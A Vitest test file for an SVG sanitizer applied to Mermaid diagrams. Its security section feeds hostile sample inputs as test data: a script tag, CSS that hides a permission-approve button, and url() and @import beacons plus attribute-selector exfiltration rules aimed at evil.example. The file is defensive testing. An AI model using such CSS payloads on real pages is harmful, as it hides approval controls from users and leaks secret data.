import { describe, it, expect, afterEach } from "vitest";
import { sanitizeSvgMarkup } from "../sanitizeSvg";

// Representative slice of Mermaid's strict/htmlLabels:false output: an inline
// <style> block that colors the diagram, native <text> labels (no
// <foreignObject>), shapes, and an arrowhead <marker>. Every legitimate
// mermaid style rule is namespaced under the diagram's own #<svgId> by its
// stylis-based CSS compiler (verified against mermaid 11.15's source).
const MERMAID_SVG = `
<svg id="mermaid-1" viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg" role="graphics-document document" aria-roledescription="flowchart-v2">
  <style>#mermaid-1 .node rect{fill:#eee;stroke:#333}#mermaid-1 .edgeLabel{color:#111}</style>
  <defs><marker id="arrow" markerWidth="10" markerHeight="10"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
  <g class="node"><rect x="0" y="0" width="80" height="40" rx="4"/><text x="40" y="20" text-anchor="middle" dominant-baseline="middle">开始 Start</text></g>
  <path class="edge" d="M80,20 L160,20" marker-end="url(#arrow)"/>
</svg>`;

describe("sanitizeSvgMarkup", () => {
  const clean = sanitizeSvgMarkup(MERMAID_SVG);

  it("preserves the inline <style> block that colors the diagram", () => {
    expect(clean).toContain("<style");
    expect(clean).toContain(".node rect");
    // Re-serialized via the browser's CSSOM, so whitespace is normalized
    // (`fill:#eee` -> `fill: #eee`); the value itself must survive intact.
    expect(clean).toMatch(/fill:\s*#eee/);
  });

  it("preserves native SVG <text> labels including non-ASCII content", () => {
    expect(clean).toContain("开始 Start");
    expect(clean).toContain("dominant-baseline");
  });

  it("preserves shapes, markers and edges", () => {
    expect(clean).toContain("<rect");
    expect(clean).toContain("<marker");
    expect(clean).toContain("marker-end");
    expect(clean).toContain("<path");
  });

  it("preserves internal url(#id) fragment references (e.g. marker-end, gradient fills)", () => {
    expect(clean).toContain('marker-end="url(#arrow)"');
  });

  it("strips scriptable content", () => {
    const malicious = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect/></svg>`;
    const sanitized = sanitizeSvgMarkup(malicious);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).toContain("<rect");
  });
});

describe("sanitizeSvgMarkup — security hardening (issue #38)", () => {
  // These probes exercise the scenario the issue describes: chart text is
  // attacker-influenceable (prompt injection / tool output), and mermaid's
  // themeCSS config key splices raw, UNSCOPED CSS into the <style> block
  // (verified in mermaid 11.15's mermaidAPI.ts createCssStyles — themeCSS is
  // string-concatenated in, bypassing the stylis `#svgId` namespacing every
  // other rule goes through). We simulate that gap directly at the SVG-string
  // level, since sanitizeSvgMarkup must defend against it regardless of
  // whether mermaid's own `secure` config lock (mermaidConfig.ts) holds.

  const withStyle = (styleContent: string, id = "mermaid-1") =>
    `<svg id="${id}" viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg"><style>${styleContent}</style><rect class="node" width="10" height="10"/></svg>`;

  it("drops document-wide selectors that are not scoped to the diagram's own id", () => {
    const malicious = withStyle("body{display:none}.ant-btn-dangerous{pointer-events:none}");
    const clean = sanitizeSvgMarkup(malicious);

    expect(clean).not.toContain("display: none");
    expect(clean).not.toContain("pointer-events");
    expect(clean).not.toMatch(/\bbody\s*\{/);
  });

  it("does not let an unscoped rule affect elements outside the sanitized SVG when injected live", () => {
    // End-to-end proof: inject the sanitized output into the live document
    // (as MermaidChartViewer/StaticMermaidChart do via dangerouslySetInnerHTML)
    // next to a probe element, and confirm the probe is unaffected.
    const probe = document.createElement("div");
    probe.id = "permission-approve-button";
    document.body.appendChild(probe);

    const malicious = withStyle(
      `#permission-approve-button{display:none !important} body{background:red}`,
    );
    const host = document.createElement("div");
    host.innerHTML = sanitizeSvgMarkup(malicious);
    document.body.appendChild(host);

    expect(getComputedStyle(probe).display).not.toBe("none");

    document.body.removeChild(probe);
    document.body.removeChild(host);
  });

  it("strips external url() beacons from style rules, even when the rest of the rule is properly scoped", () => {
    const malicious = withStyle(
      `#mermaid-1 .node{background:url(https://evil.example/beacon.png)}`,
    );
    const clean = sanitizeSvgMarkup(malicious);

    expect(clean).not.toContain("evil.example");
    expect(clean).not.toMatch(/url\(\s*https?:/);
  });

  it("strips @import (always an external, document-wide-affecting reference)", () => {
    const malicious = withStyle(`@import url(https://evil.example/steal.css);`);
    const clean = sanitizeSvgMarkup(malicious);

    expect(clean).not.toContain("evil.example");
    expect(clean).not.toContain("@import");
  });

  it("strips protocol-relative and data: url() exfil attempts targeting attribute selectors", () => {
    const malicious = withStyle(
      `#mermaid-1 [data-secret^="a"]{background:url(//evil.example/a)} #mermaid-1 [data-secret^="b"]{background:url(//evil.example/b)}`,
    );
    const clean = sanitizeSvgMarkup(malicious);

    expect(clean).not.toContain("evil.example");
  });

  it("preserves url(#id) fragment refs used by legitimate gradient/marker fills inside <style>", () => {
    const legit = withStyle(`#mermaid-1 .node rect{fill:url(#gradient1)}`);
    const clean = sanitizeSvgMarkup(legit);

    expect(clean).toContain("url(#gradient1)");
  });

  it("keeps @keyframes animation definitions (harmless without a scoped rule referencing them)", () => {
    const legit = withStyle(
      `@keyframes dash{to{stroke-dashoffset:0}}#mermaid-1 .edge-animation-fast{animation:dash 20s linear infinite}`,
    );
    const clean = sanitizeSvgMarkup(legit);

    expect(clean).toContain("@keyframes dash");
    expect(clean).toContain(".edge-animation-fast");
  });

  it("drops all styling if the SVG root has no id to scope against (fail closed)", () => {
    const malicious = `<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"><style>body{display:none}</style><rect/></svg>`;
    const clean = sanitizeSvgMarkup(malicious);

    expect(clean).not.toContain("display: none");
    expect(clean).not.toMatch(/\bbody\s*\{/);
  });

  it("does not choke on unparsable CSS text (fails closed, does not throw)", () => {
    const malformed = withStyle(`#mermaid-1 { unterminated`);
    expect(() => sanitizeSvgMarkup(malformed)).not.toThrow();
  });

  afterEach(() => {
    // Defensive cleanup in case an assertion throws mid-test and leaves a
    // probe/host element attached.
    document.querySelectorAll("#permission-approve-button").forEach((el) => el.remove());
  });
});
